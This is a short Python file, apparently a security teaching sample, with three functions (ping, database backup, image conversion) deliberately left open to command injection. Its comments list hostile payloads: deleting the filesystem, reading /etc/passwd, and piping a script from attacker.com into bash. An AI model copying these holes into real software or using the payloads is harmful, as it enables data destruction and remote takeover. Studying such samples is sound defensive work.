"""Example: Command Injection Vulnerability"""

import subprocess
import os


def ping_host(hostname: str) -> str:
    """
    Ping a hostname and return result.
    VULNERABILITY: Command injection via hostname.
    """
    # VULNERABLE: Direct command execution with user input
    command = f"ping -c 4 {hostname}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout


def backup_database(db_name: str) -> bool:
    """
    Backup database to file.
    VULNERABILITY: Command injection via db_name.
    """
    # VULNERABLE: No input sanitization
    backup_file = f"/backups/{db_name}.sql"
    os.system(f"mysqldump -u root {db_name} > {backup_file}")
    return True


def convert_image(input_file: str, output_format: str) -> str:
    """
    Convert image to different format.
    VULNERABILITY: Command injection via format.
    """
    # VULNERABLE: User-controlled format parameter
    output_file = f"output.{output_format}"
    subprocess.call(f"convert {input_file} {output_file}", shell=True)
    return output_file


# Example exploit payloads:
# ping_host("google.com; rm -rf /")  # Execute arbitrary command
# backup_database("mydb; cat /etc/passwd")  # Exfiltrate data
# convert_image("image.jpg", "png && curl attacker.com/shell.sh | bash")  # Remote code execution
